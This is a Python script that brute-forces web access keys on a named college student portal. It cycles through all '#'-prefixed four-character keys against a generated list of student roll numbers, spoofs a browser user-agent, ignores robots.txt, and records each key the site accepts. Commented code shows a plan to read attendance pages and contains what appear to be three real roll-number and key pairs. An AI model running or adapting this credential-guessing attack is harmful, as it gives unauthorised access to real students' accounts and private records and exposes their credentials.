import mechanize
from bs4 import BeautifulSoup
import itertools

def generate_combinations():
    capital_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    numbers = '0123456789'
    
    combinations = []
    
    # Generate the combinations with the given format
    for letter1 in capital_letters + numbers:
        for letter2 in capital_letters + numbers:
            for letter3 in capital_letters + numbers:
                for letter4 in capital_letters + numbers:
                    combination = '#' + letter1 + letter2 + letter3 + letter4
                    combinations.append(combination)
    
    return combinations

# Generate and print all combinations
combinations = generate_combinations()
print(len(combinations))
# Create a mechanize browser object
browser = mechanize.Browser()
browser.set_handle_robots(False)
cookies = mechanize.CookieJar()
browser.set_cookiejar(cookies)
browser.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.41 Safari/534.7')]
browser.set_handle_refresh(False)
# Login

# data={'20881A05B1':'#NN5A','20881A0574':'#E4BN','20881A05A7':'#ZF2F'}
# numb=input("enter last 2 digits:")
# numb='20881A05'+numb
# if(numb not in data):
#     pas=input("enter password:")
#     data[numb]=pas
data={}
rollnos=[]
for i in range(1,10):
    rollnos.append('20881A050'+str(i))
for i in range(10,99):
    rollnos.append('20881A05'+str(i))
for i in range(10):
    rollnos.append('20881A05A'+str(i))
for i in range(10):
    rollnos.append('20881A05B'+str(i))
for i in range(10):
    rollnos.append('20881A05C'+str(i))
for i in combinations:
    for j in rollnos:
        login_url = 'https://studentscorner.vardhaman.org/student_corner_index.php'
        browser.open(login_url)
        browser.select_form(nr=0)
        browser.form['rollno'] = j
        browser.form['wak'] = i
        response = browser.submit()
        soup = BeautifulSoup(response, 'html.parser')
        # Find the fifth table
        table = soup.find('font')
        print(str(table.text)[0],j)
        if(table.text == 'Invalid Web Access Key ' or str(table.text)[0]=='C'):
            continue
        data[j]=i
        print(j,i)
        break
print(data)
# # Continue to attendance URL
# attendance_url = 'https://studentscorner.vardhaman.org/student_attendance.php'
# response = browser.open(attendance_url)
# # Parse the HTML content using BeautifulSoup
# soup = BeautifulSoup(response, 'html.parser')
# # Find the fifth table
# table = soup.find('font')
# print(table.text)